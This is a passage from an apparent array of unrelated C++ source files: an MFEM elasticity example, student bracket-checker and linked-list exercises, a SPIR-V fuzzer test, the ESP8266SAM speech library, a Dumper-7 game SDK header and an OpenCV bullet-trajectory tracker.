        \"--no-static-condensation\", \"Enable static condensation.\");\n   args.AddOption(&visualization, \"-vis\", \"--visualization\", \"-no-vis\",\n                  \"--no-visualization\",\n                  \"Enable or disable GLVis visualization.\");\n   args.AddOption(&paraview,\"-pa\", \"--paraview\", \"-no-pa\",\n                  \"--no-paraview\",\n                  \"if use paraview for visualization.\");    \n   args.Parse();\n   if (!args.Good())\n   {\n      args.PrintUsage(cout);\n      return 1;\n   }\n   args.PrintOptions(cout);\n\n   // 2. \u4ece\u5916\u90e8\u6587\u4ef6\u8bfb\u53d6\u7f51\u683c\u6570\u636e\n   Mesh mesh(mesh_file, 1, 1);\n   int dim = mesh.Dimension();\n\n   if (mesh.attributes.Max() < 2 || mesh.bdr_attributes.Max() < 2)\n   {\n      cerr << \"\\nInput mesh should have at least two materials and \"\n           << \"two boundary attributes! (See schematic in ex2.cpp)\\n\"\n           << endl;\n      return 3;\n   }\n\n   // 3. Select the order of the finite element discretization space. For NURBS\n   //    meshes, we increase the order by degree elevation.\n   if (mesh.NURBSext)\n   {\n      mesh.DegreeElevate(order, order);\n   }\n\n   // 4. \u7f51\u683c\u52a0\u5bc6\n      for (int l = 0; l < ref_levels; l++)\n      {\n         mesh.UniformRefinement();\n      }\n\n   // 5. \u5b9a\u4e49\u7f51\u683c\u7a7a\u95f4\n\n   FiniteElementCollection *fec;\n   FiniteElementSpace *fespace;\n   if (mesh.NURBSext)\n   {\n      fec = NULL;\n      fespace = mesh.GetNodes()->FESpace();\n   }\n   else\n   {\n      fec = new H1_FECollection(order, dim);\n      fespace = new FiniteElementSpace(&mesh, fec, dim);\n   }\n   cout << \"Number of finite element unknowns: \" << fespace->GetTrueVSize()\n        << endl << \"Assembling: \" << flush;\n\n   // 6. \u8bbe\u7f6e\u56fa\u5b9a\u8fb9\u754c\u6761\u4ef6\n   Array<int> ess_tdof_list, ess_bdr(mesh.bdr_attributes.Max());\n   ess_bdr = 0;\n   ess_bdr[0] = 1; // =1 essential \u8fb9\u754c\u6761\u4ef6\n   fespace->GetEssentialTrueDofs(ess_bdr, ess_tdof_list);\n\n   // 7. \u8bbe\u7f6e\u7ed9\u5b9a\u529b\u7684\u8fb9\u754c\u6761\u4ef6\n   VectorArrayCoefficient f(dim);\n   for (int i = 0; i < dim-1; i++)\n   {\n      f.Set(i, new ConstantCoefficient(0.0));\n   }\n   {\n      Vector pull_force(mesh.bdr_attributes.Max()); \n      pull_force = 0.0;\n      pull_force(1) = -1.0e-2;// \u5728bdr\u6807\u8bb0\u7b2c2\u4e2a\u4f4d\u7f6e\u4e0a\u8bbe\u7f6e\u8fb9\u754c\u529b\u7684\u503c\uff0c\u5176\u4ed6\u8fb9\u754c\u529b\u4e3a0\n      f.Set(dim-1, new PWConstCoefficient(pull_force));//piece-wise constants coefficient\n      //f.Set(dim-1,new",
    "\ufeff#include <iostream>\n#include <string>\n#include \"Stack.h\"\nusing namespace std;\n\nbool pairMatches(char opening, char closing) {\n    return (opening == '(' && closing == ')') ||\n        (opening == '{' && closing == '}') ||\n        (opening == '[' && closing == ']');\n}\n\nvoid checkBrackets(const string& str) {\n    Stack line;\n    for (int i = 0; i < str.length(); i++) {\n        char current = str[i];\n        if (current == '(' || current == '{' || current == '[') {\n            line.Push(i);\n        }\n        else if (current == ')' || current == '}' || current == ']') {\n            if (line.length() == 0) {\n                cout << \"No opening bracket matches a closing one. Index of closing = \" << i << endl;\n                cout << \"Your line before an error: \" << str.substr(0, i + 1) << endl;\n            }\n            else {\n                int openingIndex = line.Pop();\n                if (!pairMatches(str[openingIndex], current)) {\n                    cout << \"Bracket types don't match. Index of closing = \" << i << endl;\n                    cout << \"Your line before an error: \" << str.substr(0, i + 1) << endl;\n                }\n            }\n        }\n    }\n\n    if (line.length() != 0) {\n        cout << \"No closing bracket matches a opening one. Index of opening = \" << line.Top() << endl;\n        cout << \"Your line before an error: \" << str.substr(0, line.Top() + 1) << endl;\n    }\n    else {\n        cout << \"Your line is correct!\" << endl;\n    }\n}\n\nint main() {\n    string userLine;\n    cout << \"Input a line, it should end with \\'\\;\\': \";\n    getline(cin, userLine);\n\n    if (!userLine.empty() && userLine.back() == ';') {\n        userLine.pop_back();\n    }\n\n    checkBrackets(userLine);\n}",
    "#include<iostream>\n#include<vector>\nusing namespace std;\ntypedef int  ElemType;\n//////////\u5355\u94fe\u8868\u7ed3\u6784\u4f53\u521b\u5efa///////////\ntypedef struct LNode{\n\tElemType data;\n\tstruct LNode *next;\n} LinkNode;\n//////////\u5c3e\u63d2\u6cd5\u5efa\u7acb\u5355\u94fe\u8868///////////\nvoid CreteList(LinkNode *&l,ElemType a[],int n){\n\tLinkNode *s,*r;\n\tl=(LinkNode*)malloc(sizeof(LinkNode));//\u521b\u5efa\u5934\u8282\u70b9\n\tr=l;//r\u59cb\u7ec8\u6307\u5411\u4e3a\u8282\u70b9\n\tfor(int i=0;i<n;i++){//\u5faa\u73af\u5efa\u7acb\u6570\u636e\u8282\u70b9\n\ts=(LinkNode*)malloc(sizeof(LinkNode));\n\ts->data=a[i];//\u521b\u5efa\u6570\u636e\u8282\u70b9\n\tr->next=s;//\u5c06s\u63d2\u5165r\u4e4b\u540e\n\tr=s;\n\t}\n\tr->next=NULL;//\u5c3e\u8282\u70b9\u6307\u9488\u7f6e\u7a7a\n}\n///////////\u5355\u94fe\u8868\u521d\u59cb\u5316////////////\nvoid InitList(LinkNode *&l){\n\tl=(LinkNode*)malloc(sizeof(LinkNode));\n\tl->next=NULL;\n}\n//////////\u5355\u94fe\u8868\u7684\u4e8c\u8def\u5f52\u5e76\u7b97\u6cd5////////////\nvoid UnionList(LinkNode *la, LinkNode *lb, LinkNode *&lc){\n    LinkNode *pa = la->next, *pb = lb->next, *s, *r;//r\u7528\u6765\u6dfb\u52a0\u5143\u7d20\u8fdblc\uff0cs\u7528\u6765\u590d\u5236\u8282\u70b9\n    lc = (LinkNode *)malloc(sizeof(LinkNode));//\u521d\u59cb\u5316lc\uff0c\u7ed9\u4ed6\u521b\u9020\u7a7a\u95f4\n    r = lc; // r\u6307\u5411\u5c3e\u8282\u70b9\n    //\u5c06la,lb\u8fdb\u884c\u6bd4\u8f83\uff0c\u8f83\u5c0f\u7684\u7ed3\u679c\u653e\u5165lc\n    while (pa != NULL && pb != NULL) {\n        if (pa->data <= pb->data) {\n            s = (LinkNode*)malloc(sizeof(LinkNode));\n            s->data = pa->data;//\u590d\u5236\u8282\u70b9pa\n            r->next = s;//\u5c06la\u63d2\u5165lc\n            r = s;//\u66f4\u65b0r\u8282\u70b9\u4f4d\u7f6e\n            pa = pa->next;//\u66f4\u65b0pa\u8282\u70b9\u4f4d\u7f6e\n        } else {\n            s = (LinkNode*)malloc(sizeof(LinkNode));\n            s->data = pb->data;//\u590d\u5236\u8282\u70b9pb\n            r->next = s;//\u5c06lb\u63d2\u5165lc\n            r = s;//\u66f4\u65b0r\u8282\u70b9\u4f4d\u7f6e\n            pb = pb->next;//\u66f4\u65b0pa\u8282\u70b9\u4f4d\u7f6e\n        }\n    }\n    //\u5904\u7406la\u672a\u904d\u5386\u5b8c\u5168\u7684\u60c5\u51b5\n    while (pa != NULL) {\n        s = (LinkNode*)malloc(sizeof(LinkNode));\n        s->data = pa->data;\n        r->next = s;\n        r = s;\n        pa = pa->next;\n    }\n\t//\u5904\u7406la\u672a\u904d\u5386\u5b8c\u5168\u7684\u60c5\u51b5\n    while (pb != NULL) {\n        s = (LinkNode*)malloc(sizeof(LinkNode));\n        s->data = pb->data;\n        r->next = s;\n        r = s;\n        pb = pb->next;\n    }\n\n    r->next = NULL; // \u5c3e\u8282\u70b9\u6307\u9488\u7f6e\u7a7a\n}\nint main(){\n    ElemType arr1[] = {1, 2, 5, 7, 9};\n    ElemType arr2[] = {2, 4, 6, 8, 10};\n\n    LinkNode *l1, *l2, *l3;//\u5b9a\u4e49\u94fe\u8868\n    CreteList(l1, arr1, 5);\n    CreteList(l2, arr2, 5);\n    cout << \"\u5355\u94fe\u8868 1: \";\n    LinkNode *p1 = l1->next;\n    while (p1) {\n        cout << p1->data << \" \";\n        p1 = p1->next;\n    }\n    cout << endl;\n\n    cout << \"\u5355\u94fe\u8868 2: \";\n    LinkNode *p2 = l2->next;\n    while (p2) {\n        cout << p2->data << \" \";\n        p2 = p2->next;\n    }\n    cout << endl;\n\n    UnionList(l1, l2, l3);\n\n    cout << \"\u6392\u5e8f\u540e\u7684\u94fe\u8868 List: \";\n    LinkNode *p3 = l3->next;\n    while (p3) {\n        cout << p3->data << \" \";\n        p3 = p3->next;\n    }\n    cout << endl;\n    getchar();//\u9632\u6b62\u7a0b\u5e8f\u95ea\u9000\n    getchar();\n    return 0;\n}",
    "// Copyright (c) 2021 Shiyu Liu\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n#include \"source/fuzz/transformation_wrap_vector_synonym.h\"\n\n#include \"gtest/gtest.h\"\n#include \"source/fuzz/fuzzer_util.h\"\n#include \"source/fuzz/instruction_descriptor.h\"\n#include \"test/fuzz/fuzz_test_util.h\"\n\nnamespace spvtools {\nnamespace fuzz {\nnamespace {\n\nTEST(TransformationWrapVectorSynonym, BasicTest) {\n  std::string shader = R\"(\n               OpCapability Shader\n          %1 = OpExtInstImport \"GLSL.std.450\"\n               OpMemoryModel Logical GLSL450\n               OpEntryPoint Fragment %4 \"main\" %97\n               OpExecutionMode %4 OriginUpperLeft\n               OpSource ESSL 310\n               OpName %4 \"main\"\n          %2 = OpTypeVoid\n          %3 = OpTypeFunction %2\n          %6 = OpTypeInt 32 1\n          %7 = OpTypePointer Function %6\n          %9 = OpConstant %6 10\n         %11 = OpConstant %6 -5\n         %12 = OpTypeVector %6 2\n         %13 = OpTypePointer Function %12\n         %18 = OpTypeInt 32 0\n         %19 = OpTypePointer Function %18\n         %21 = OpConstant %18 8\n         %23 = OpConstant %18 2\n         %24 = OpTypeVector %18 3\n         %25 = OpTypePointer Function %24\n         %31 = OpTypeFloat 32\n         %32 = OpTypePointer Function %31\n         %34 = OpConstant %31 3.29999995\n         %36 = OpConstant %31 1.10000002\n         %37 = OpTypeVector %31 4\n         %38 = OpTypePointer Function %37\n         %96 = OpTypePointer Input %31\n         %97 = OpVariable %96 Input\n          %4 = OpFunction %2 None %3\n          %5 = OpLabel\n          %8 = OpVariable %7 Function\n         %10 = OpVariable %7 Function\n         %14 = OpVariable %13 Function\n         %20 = OpVariable %19 Function\n         %22 = OpVariable %19 Function\n         %26 = OpVariable %25 Function\n         %33 = OpVariable %32 Function\n         %35 = OpVariable %32 Function\n         %39 = OpVariable %38 Function\n         %47 = OpVariable %7 Function\n         %51 = OpVariable %7 Function\n         %55 = OpVariable %7 Function\n         %59 = OpVariable %7 Function\n         %63 = OpVariable %19 Function\n         %67 = OpVariable %19 Function\n         %71 = OpVariable %19 Function\n         %75 = OpVariable %19 Function\n         %79 = OpVariable %32 Function\n         %83 = OpVariable %32 Function\n         %87 = OpVariable %32 Function\n         %91 = OpVariable %32 Function\n               OpStore %8 %9\n               OpStore %10 %11\n         %15 = OpLoad %6 %8\n         %16 = OpLoad %6 %10\n         %17 = OpCompositeConstruct %12 %15 %16\n               OpStore %14 %17\n               OpStore %20 %21\n               OpStore %22 %23\n         %27 = OpLoad %18 %20\n         %28 = OpLoad %18 %20\n         %29 = OpLoad %18 %22\n         %30 = OpCompositeConstruct %24 %27 %28 %29\n               OpStore %26 %30\n               OpStore %33 %34\n               OpStore %35 %36\n         %40 = OpLoad %31 %33\n         %41 = OpLoad %31 %33\n         %42 = OpLoad %31 %35\n         %43 = OpLoad %31 %35\n         %44 = OpCompositeConstruct %37 %40 %41 %42 %43\n         %45 = OpLoad %37 %39\n         %46 = OpVectorShuffle %37 %45 %44 5 6 7 4\n               OpStore %39 %46\n         %48 = OpLoad %6 %8\n         %49 = OpLoad %6 %10\n        %100 = OpCompositeConstruct %12 %48 %48\n        %101 = OpCompositeConstruct %12 %49 %49\n         %50 = OpIAdd %6 %48 %49\n               OpStore %47 %50\n         %52 = OpLoad %6 %8\n         %53 = OpLoad %6 %10\n         %54 = OpISub %6 %52 %53\n               OpStore %51 %54\n         %56 = OpLoad %6 %8\n         %57 = OpLoad %6 %10\n         %58 = OpIMul %6 %56 %57\n               OpStore %55 %58\n         %60 = OpLoad %6 %8\n         %61 = OpLoad %6 %10\n         %62 = OpSDiv %6 %60 %61\n               OpStore %59 %62\n         %64 = OpLoad %18 %20\n         %65 = OpLoad %18 %22\n         %66 = OpIAdd %18 %64 %65\n               OpStore %63 %66\n         %68 = OpLoad %18 %20\n         %69 = OpLoad %18 %22\n         %70 = OpISub %18 %68 %69\n               OpStore %67 %70\n         %72 = OpLoad %18 %20\n         %73 = OpLoad %18 %22\n         %74 = OpIMul %18 %72 %73\n               OpStore %71 %74\n         %76 = OpLoad %18 %20\n         %77 = OpLoad %18 %22\n         %78 = OpUDiv %18 %76 %77\n               OpStore %75 %78\n         %80 = OpLoad %31 %33\n         %81 = OpLoad %31 %35\n         %82 = OpFAdd %31 %80 %81\n               OpStore %79 %82\n         %84 = OpLoad %31 %33\n         %85 = OpLoad %31 %35\n         %86 = OpFSub %31 %84 %85\n               OpStore %83 %86\n        ",
    "/*\n  ESP8266SAM\n  Port of SAM to the ESP8266\n\n  Copyright (C) 2017  Earle F. Philhower, III\n  This program is free software: you can redistribute it and/or modify\n  it under the terms of the GNU General Public License as published by\n  the Free Software Foundation, either version 3 of the License, or\n  (at your option) any later version.\n  This program is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n  GNU General Public License for more details.\n  You should have received a copy of the GNU General Public License\n  along with this program.  If not, see <http://www.gnu.org/licenses/>.\n*/\n\n#include <stdint.h>\n#include <string.h>\n#include <ctype.h>\n#include <stdio.h>\n\n#include <ESP8266SAM.h>\n\n#include \"reciter.h\"\n#include \"sam.h\"\n#include \"SamData.h\"\n\n#ifndef ESP8266\nstatic void yield() { /* NOOP */ }\n#endif\n\nSamData* samdata;\n\n// Thunk from C to C++ with a this-> pointer\nvoid ESP8266SAM::OutputByteCallback(void *cbdata, unsigned char b)\n{\n  ESP8266SAM *sam = static_cast<ESP8266SAM*>(cbdata);\n  sam->OutputByte(b);\n}\n\nvoid ESP8266SAM::OutputByte(unsigned char b)\n{\n  // Xvert unsigned 8 to signed 16...\n  int16_t s16 = b;\n  s16 -= 128;\n  s16 *= 128;\n  int16_t sample[2];\n  sample[0] = s16;\n  sample[1] = s16;\n  while (!output_cb((void*)(0), sample)) yield();\n}\n\nbool ESP8266SAM::Say(const char *str)\n{\n  if (!str || strlen(str)>254) return false; // Only can speak up to 1 page worth of data...\n  samdata = new SamData;\n  if (samdata == nullptr)\n  {\n      // allocation failed!\n      return false;\n  }\n\n  // SAM settings\n  EnableSingmode(singmode);\n  if (speed) ::SetSpeed(speed);\n  if (pitch) ::SetPitch(pitch);\n  if (mouth) ::SetMouth(mouth);\n  if (throat) ::SetThroat(throat);\n\n  // Input massaging\n  char input[256];\n  for (int i=0; str[i]; i++)\n    input[i] = toupper((int)str[i]);\n  input[strlen(str)] = 0;\n\n  // To phonemes\n  if (phonetic) {\n    strncat(input, \"\\x9b\", 255);\n  } else {\n    strncat(input, \"[\", 255);\n    if (!TextToPhonemes(input)) return false; // ERROR\n  }\n\n  // Say it!\n  SetInput(input);\n  SAMMain(OutputByteCallback, (void*)this);\n  delete samdata;\n  return true;\n}\n\nvoid ESP8266SAM::SetVoice(enum SAMVoice voice)\n{\n  switch (voice) {\n    case VOICE_ELF: SetSpeed(72); SetPitch(64); SetThroat(110); SetMouth(160); break;\n    case VOICE_ROBOT: SetSpeed(92); SetPitch(60); SetThroat(190); SetMouth(190); break;\n    case VOICE_STUFFY: SetSpeed(82); SetPitch(72); SetThroat(110); SetMouth(105); break;\n    case VOICE_OLDLADY: SetSpeed(82); SetPitch(32); SetThroat(145); SetMouth(145); break;\n    case VOICE_ET: SetSpeed(100); SetPitch(64); SetThroat(150); SetMouth(200); break;\n    default:\n    case VOICE_SAM: SetSpeed(72); SetPitch(64); SetThroat(128); SetMouth(128); break;\n  }\n}\n\n",
    "#pragma once\n\n/*\n* SDK generated by Dumper-7\n*\n* https://github.com/Encryqed/Dumper-7\n*/\n\n// Package: AthenaLeaderboardTab\n\n#include \"Basic.hpp\"\n\n#include \"AthenaLeaderboardTab_classes.hpp\"\n#include \"AthenaLeaderboardTab_parameters.hpp\"\n\n\nnamespace SDK\n{\n\n// Function AthenaLeaderboardTab.AthenaLeaderboardTab_C.ExecuteUbergraph_AthenaLeaderboardTab\n// (Final, UbergraphFunction, HasDefaults)\n// Parameters:\n// int32                                   EntryPoint                                             (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid UAthenaLeaderboardTab_C::ExecuteUbergraph_AthenaLeaderboardTab(int32 EntryPoint)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"AthenaLeaderboardTab_C\", \"ExecuteUbergraph_AthenaLeaderboardTab\");\n\n\tParams::AthenaLeaderboardTab_C_ExecuteUbergraph_AthenaLeaderboardTab Parms{};\n\n\tParms.EntryPoint = EntryPoint;\n\n\tUObject::ProcessEvent(Func, &Parms);\n}\n\n\n// Function AthenaLeaderboardTab.AthenaLeaderboardTab_C.OnInputMethodChanged_Event_0\n// (BlueprintCallable, BlueprintEvent)\n// Parameters:\n// ECommonInputType                        bNewInputType                                          (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid UAthenaLeaderboardTab_C::OnInputMethodChanged_Event_0(ECommonInputType bNewInputType)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"AthenaLeaderboardTab_C\", \"OnInputMethodChanged_Event_0\");\n\n\tParams::AthenaLeaderboardTab_C_OnInputMethodChanged_Event_0 Parms{};\n\n\tParms.bNewInputType = bNewInputType;\n\n\tUObject::ProcessEvent(Func, &Parms);\n}\n\n\n// Function AthenaLeaderboardTab.AthenaLeaderboardTab_C.BndEvt__BacchusClose2Button_K2Node_ComponentBoundEvent_30_CommonButtonClicked__DelegateSignature\n// (BlueprintEvent)\n// Parameters:\n// class UCommonButton*                    Button                                                 (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, InstancedReference, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid UAthenaLeaderboardTab_C::BndEvt__BacchusClose2Button_K2Node_ComponentBoundEvent_30_CommonButtonClicked__DelegateSignature(class UCommonButton* Button)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"AthenaLeaderboardTab_C\", \"BndEvt__BacchusClose2Button_K2Node_ComponentBoundEvent_30_CommonButtonClicked__DelegateSignature\");\n\n\tParams::AthenaLeaderboardTab_C_BndEvt__BacchusClose2Button_K2Node_ComponentBoundEvent_30_CommonButtonClicked__DelegateSignature Parms{};\n\n\tParms.Button = Button;\n\n\tUObject::ProcessEvent(Func, &Parms);\n}\n\n\n// Function AthenaLeaderboardTab.AthenaLeaderboardTab_C.BndEvt__BacchusCloseButton_K2Node_ComponentBoundEvent_35_CommonButtonClicked__DelegateSignature\n// (BlueprintEvent)\n// Parameters:\n// class UCommonButton*                    Button                                                 (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, InstancedReference, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid UAthenaLeaderboardTab_C::BndEvt__BacchusCloseButton_K2Node_ComponentBoundEvent_35_CommonButtonClicked__DelegateSignature(class UCommonButton* Button)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"AthenaLeaderboardTab_C\", \"BndEvt__BacchusCloseButton_K2Node_ComponentBoundEvent_35_CommonButtonClicked__DelegateSignature\");\n\n\tParams::AthenaLeaderboardTab_C_BndEvt__BacchusCloseButton_K2Node_ComponentBoundEvent_35_CommonButtonClicked__DelegateSignature Parms{};\n\n\tParms.Button = Button;\n\n\tUObject::ProcessEvent(Func, &Parms);\n}\n\n\n// Function AthenaLeaderboardTab.AthenaLeaderboardTab_C.OnActivated\n// (Event, Protected, BlueprintEvent)\n\nvoid UAthenaLeaderboardTab_C::OnActivated()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"AthenaLeaderboardTab_C\", \"OnActivated\");\n\n\tUObject::ProcessEvent(Func, nullptr);\n}\n\n\n// Function AthenaLeaderboardTab.AthenaLeaderboardTab_C.OnQueryStarted\n// (Event, Protected, BlueprintEvent)\n\nvoid UAthenaLeaderboardTab_C::OnQueryStarted()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"AthenaLeaderboardTab_C\", \"OnQueryStarted\");\n\n\tUObject::ProcessEvent(Func, nullptr);\n}\n\n\n// Function AthenaLeaderboardTab.AthenaLeaderboardTab_C.OnQueryFinished\n// (Event, Protected, BlueprintEvent)\n\nvoid UAthenaLeaderboardTab_C::OnQueryFinished()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nullptr)\n\t\tFunc = Class->GetFunction(\"AthenaLeaderboardTab_C\", \"OnQueryFinished\");\n\n\tUObject::ProcessEvent(Func, nullptr);\n}\n\n\n// Function AthenaLeaderboardTab.AthenaLeaderboardTab_C.OnDeactivated\n// (Event, Protected, BlueprintEvent)\n\nvoid UAthenaLeaderboardTab_C::OnDeactivated()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (Func == nu",
    "#include \"orbit_tracker.hpp\"\n#include <algorithm>\n#include <cmath>\nnamespace armor{ \n\n    //\u8fd4\u56detracking_bullet\u4e2d\u7684time_array\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\n    armor::ImageBullet tracking_bullets::get_last_bullet() {\n    if (time_array.empty()) {\n        // \u5982\u679ctime_array\u4e3a\u7a7a\uff0c\u5219\u8fd4\u56de\u4e00\u4e2a\u9ed8\u8ba4\u7684ImageBullet\u5bf9\u8c61\n        return armor::ImageBullet();\n        }\n    return time_array.back();\n    }\n\n\n    //\u7528\u6765\u68c0\u6d4b\u632f\u52a8\u6216\u79fb\u52a8\u7684\u51fd\u6570\uff0c\u5982\u679c\u68c0\u6d4b\u5230\u632f\u52a8\u6216\u79fb\u52a8\uff0c\u5219\u8fd4\u56detrue\uff0c\u5426\u5219\u8fd4\u56defalse\n    bool orbit_tracker::detect_vibration(cv::Mat &frame , cv::Mat &last_frame){\n        cv::Mat frame_gray; cv::Mat last_frame_gray;//\u7528\u6765\u6682\u65f6\u5b58\u50a8\u7070\u5ea6\u56fe\u50cf\u7684\u53d8\u91cf\n        cv::cvtColor(frame,frame_gray,cv::COLOR_BGR2GRAY);\n        cv::cvtColor(last_frame,last_frame_gray,cv::COLOR_BGR2GRAY);\n        cv::absdiff(frame_gray,last_frame_gray,this->mat_diff);\n        cv::Scalar sum_scalar = cv::sum(this->mat_diff);\n        double sum = sum_scalar[0];\n        // std::cout<<\"mean_diff:\" << sum << std::endl;    \n        if (sum  < this->vibration_threshold){\n            return false;\n        }\n        if (this->current_status == temp_move){\n            move_frame_cnt++;\n            if (move_frame_cnt >= this->move_frame_threshold){\n                this->orbit_tracker_reset();\n            }\n        }\n        else{\n            this->current_status = temp_move;\n            move_frame_cnt = 0;\n        }\n        return true;\n    }\n    //\u7528\u6765\u91cd\u7f6e\u8ddf\u8e2a\u5668\u7684\u51fd\u6570\uff0c\u5c06\u6240\u6709\u53d8\u91cf\u91cd\u7f6e\u4e3a\u521d\u59cb\u72b6\u6001\n    bool orbit_tracker::orbit_tracker_reset(){\n        this->move_frame_cnt = 0;\n        this->tracking_bullets_array.clear();\n        this->last_frame_bullets.clear();\n        this->mat_diff.release();\n        current_status = temp_move;\n        std::cout<<\"\u56e0\u68c0\u6d4b\u5230\u632f\u52a8\u6216\u79fb\u52a8,tracker\u5df2\u91cd\u7f6e\"<<std::endl;\n        return true;\n    }\n\n\n\n    //\u7528\u6765\u5339\u914d\u5b50\u5f39\u7684\u51fd\u6570\uff0c\u5982\u679c\u4e24\u4e2a\u5b50\u5f39\u7684\u8ddd\u79bb\u5c0f\u4e8e\u4e24\u4e2a\u5b50\u5f39\u534a\u5f84\u7684\u6700\u5c0f\u503c\u7684\u5e73\u65b9\uff0c\u5219\u8ba4\u4e3a\u5b83\u4eec\u5339\u914d\uff0c\u8fd4\u56detrue\uff0c\u5426\u5219\u8fd4\u56defalse\n    bool orbit_tracker::match_bullet(const armor::ImageBullet &a, const armor::ImageBullet &b) {\n        double dst = std::pow(a.center.x - b.center.x, 2) + std::pow(a.center.y - b.center.y, 2);\n        if ((dst < std::pow(std::max(a.radius, b.radius), 2)+500)&& (dst >std::pow(std::max(a.radius, b.radius),2)+65)) {\n            std::cout << \"\u5b50\u5f39\u5339\u914d\u6210\u529f!\" << std::endl;\n            return true;\n        }\n        return false;\n    }\n\n    //\u7528\u6765\u7ed8\u5236\u5b50\u5f39\u8f68\u8ff9\u7684\u51fd\u6570\uff0c\u5c06\u6240\u6709\u5b50\u5f39\u7684\u8f68\u8ff9\u7ed8\u5236\u5728\u56fe\u50cf\u4e0a\n    void orbit_tracker::draw_orbit(cv::Mat &frame){\n        \n        for (std::vector<armor::tracking_bullets>::iterator it = this->tracking_bullets_array.begin(); it != this->tracking_bullets_array.end();it++){\n            armor::ImageBullet last_bullet;\n            std::cout << \"\u7ed8\u753b\u6b63\u5728\u5c1d\u8bd5\u5f00\u59cb!\" << std::endl;\n            \n            for (std::vector<armor::ImageBullet>::iterator it2 = it->time_array.begin(); it2 != it->time_array.end();it2++){\n                std::cout << \"\u5f00\u59cb\u7ed8\u753b\u8f68\u8ff9\" << std::endl;\n                if (it2 ==it->time_array.begin()){\n                    last_bullet = *it2;\n                }\n                else{\n                    cv::line(frame, last_bullet.center, it2->center, cv::Scalar(0, 255, 0), 2);\n                    std::cout << \"\u6210\u529f\u7ed8\u5236\u7ebf\u6761\" << std::endl;\n                    last_bullet = *it2;\n                }\n            }\n        }\n    }\n    \n    // \u7528\u6765\u91cd\u7f6e\u5b50\u5f39\u7684flag\u7684\u51fd\u6570\uff0c\u5c06\u6240\u6709\u5b50\u5f39\u7684\u5339\u914dflag\u91cd\u7f6e\u4e3a1\n    void orbit_tracker::reset_match_flag(){\n        for (auto &it : this->last_frame_bullets){\n            it.match_flag = 1;\n        }\n        std::cout << \"flag\u91cd\u7f6e\u6210\u529f\" << std::endl;\n    }\n\n\n    void orbit_tracker::update_lost_time(){\n    auto it = this->tracking_bullets_array.begin();\n    while (it != this->tracking_bullets_array.end()) {\n        if (it->lost_flag == 1 && it->last_lost_flag == 1) {\n            it->lost_time++;\n            if (it->lost_time >= it->lost_time_threshold) {\n                it = this->tracking_bullets_array.erase(it); // \u8fd4\u56de\u65b0\u7684\u8fed\u4ee3\u5668\n            }\n            else {\n                ++it; // \u53ea\u6709\u5f53\u6ca1\u6709\u5220\u9664\u5143\u7d20\u65f6\u624d\u79fb\u52a8\u8fed\u4ee3\u5668\n            }\n        }\n        else if(it->lost_flag == 1 && it->last_lost_flag == 0){\n            it->last_lost_flag = 1;\n            it->lost_time = 0;\n            ++it;\n        }\n        else{\n            it->last_lost_flag = it->lost_flag;\n            it->lost_flag = 1;\n            ++it;\n        }\n    }\n    std::cout << \"lost_time\u66f4\u65b0\u6210\u529f\" << std::endl;\n    }\n\n    void orbit_tracker::set_all_lost_flag() {\n    for (auto &it : this->tracking_bullets_array) {\n        it.lost_flag = 1;\n    }\n    }\n\n    void orbit_tracker::push_bullets_into_array(armor::ImageBullet last_bullet , armor::ImageBullet bullet){\n        tracking_bullets temp_tracking_bullets;\n        temp_tracking_bullets.time_array.push_back(last_bullet);\n        temp_tracking_bullets.time_array.push_back(bullet);\n        this->tracking_bullets_array.push_back(temp_tracking_bullets);\n    }\n\n    void orbit_tracker::process_new_bullets(std::vector<armor::ImageBullet> &bullets){\n        //\u904d\u5386\u6240\u6709\u65e7\u5b50\u5f39\u548c\u65b0\u5b50\u5f39\n        std::cout<<\"\u73b0\u5728\u662f\u7b2c\"<<this->frame_count<<\"\u5e27\uff0c\u68c0\u6d4b\u5230\u5b50\u5f39\u6570\u91cf\u4e3a:\"<<bullets.size()<<\n        \" \u4e0a\u4e00\u5e27\u68c0\u6d4b\u5230\u7684\u5b50\u5f39\u6570\u91cf\u4e3a:\"<<this->last_frame_bullets.size()<<\"\u6b63\u5728\u8ffd\u8e2a\u7684\u5b50\u5f39\u6570\u91cf:\"<< this->tracking_bullets_array.size()<<std::endl;\n        for (auto &last_bullet : this->last_frame_bullets){\n            // std::co",
